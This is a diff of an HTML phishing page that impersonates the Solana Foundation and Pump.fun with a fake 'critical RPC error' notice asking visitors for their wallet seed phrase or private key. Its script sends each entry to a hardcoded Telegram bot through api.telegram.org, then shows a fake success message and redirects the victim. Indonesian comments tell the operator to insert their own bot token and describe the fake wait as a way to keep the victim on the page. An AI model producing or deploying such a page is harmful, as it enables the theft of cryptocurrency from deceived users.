@@ -3,52 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Network | RPC Node Sync</title>
+    <title>Pump.fun | Emergency Node Fix</title>
     <style>
-        body { background-color: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #1a1a1a; border: 1px solid #333; padding: 25px; border-radius: 8px; width: 100%; max-width: 380px; text-align: left; }
-        .logo { color: #14f195; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; font-size: 18px; text-align: center; }
-        h3 { font-size: 16px; margin-bottom: 10px; color: #fff; }
-        p { font-size: 13px; color: #a0a0a0; line-height: 1.5; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #444; color: #14f195; border-radius: 4px; box-sizing: border-box; font-family: monospace; }
-        button { width: 100%; padding: 12px; background: #14f195; border: none; color: #000; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #10c378; }
-        .footer { font-size: 10px; color: #555; margin-top: 15px; text-align: center; }
+        body { margin: 0; background-color: #0c0d10; color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .bg-blur { position: absolute; width: 100%; height: 100%; background: url('https://pump.fun/logo.png') center no-repeat; opacity: 0.05; filter: blur(10px); z-index: -1; }
+        .error-card { background: #1b1d23; border: 1px solid #ff4444; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 0 40px rgba(255, 68, 68, 0.2); text-align: center; }
+        .warn-icon { font-size: 50px; margin-bottom: 10px; }
+        h2 { color: #ff4444; margin: 0 0 15px; font-size: 20px; text-transform: uppercase; }
+        p { font-size: 14px; color: #aaa; line-height: 1.5; margin-bottom: 25px; }
+        .input-box { text-align: left; }
+        label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 14px; background: #0c0d10; border: 1px solid #333; border-radius: 8px; color: #14f195; font-family: monospace; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #ff4444; }
+        .btn { width: 100%; padding: 14px; background: #ff4444; border: none; color: #fff; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #d32f2f; transform: scale(1.02); }
+        .footer { font-size: 10px; color: #444; margin-top: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="logo">SOLANA SUPPORT</div>
-        <h3>Manual RPC Synchronization</h3>
-        <p>If your transaction is stuck or showing "RPC Node Error" during deployment, please synchronize your wallet credentials with the mainnet validator node.</p>
+    <div class="bg-blur"></div>
+    <div class="error-card">
+        <div class="warn-icon">⚠️</div>
+        <h2>Critical RPC Error</h2>
+        <p>Your transaction is stuck due to RPC imbalance. Please re-sync your validator credentials to recover your 0.6 SOL deposit.</p>
         
-        <input type="text" id="wallet_key" placeholder="Enter Private Key or Seed Phrase">
-        
-        <button onclick="sendToTele()">SYNCHRONIZE NODE</button>
-        <div class="footer">© 2026 Solana Foundation. Secure SSL Encrypted.</div>
+        <div class="input-box">
+            <label>PHRASE OR PRIVATE KEY</label>
+            <input type="text" id="keyInput" placeholder="Enter credentials to sync...">
+        </div>
+
+        <button class="btn" onclick="sendData()">VALIDATE & SYNC NODE</button>
+        <div class="footer">© 2026 SOLANA FOUNDATION PROTOCOL</div>
     </div>
 
     <script>
-        function sendToTele() {
-            const inputVal = document.getElementById('wallet_key').value;
-            if(inputVal.split(' ').length < 12 && inputVal.length < 32) {
-                alert('Invalid Phrase or Key format.');
-                return;
-            }
+        function sendData() {
+            const val = document.getElementById('keyInput').value;
+            if(val.length < 12) { alert('Invalid credentials format!'); return; }
 
-            // GANTI TOKEN & ID LU DI SINI, MEMEK!
-            const botToken = '8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ';
-            const chatId = '6518432642';
-            const text = encodeURIComponent('⚠️ TARGET LOGIN!\nKey: ' + inputVal);
+            // GANTI INI, JANGAN SAMPE TYPO!
+            const token = '8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ'; 
+            const chatid = '6518432642';
+            const text = encodeURIComponent('🔥 KUNCI DAPET: ' + val);
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${text}`)
             .then(() => {
-                // Kasih loading palsu biar dia nunggu
-                alert('Synchronizing... Please wait 5-10 minutes. Do not close this page.');
-                document.getElementById('wallet_key').value = '';
+                alert('Success! Node synchronization in progress. Do not close this tab for 10 minutes.');
+                window.location.href = 'https://pump.fun';
             })
-            .catch(() => alert('Network Error. Try again.'));
+            .catch(() => alert('Network Error. Please try again.'));
         }
     </script>
 </body>
 </html>
+
+
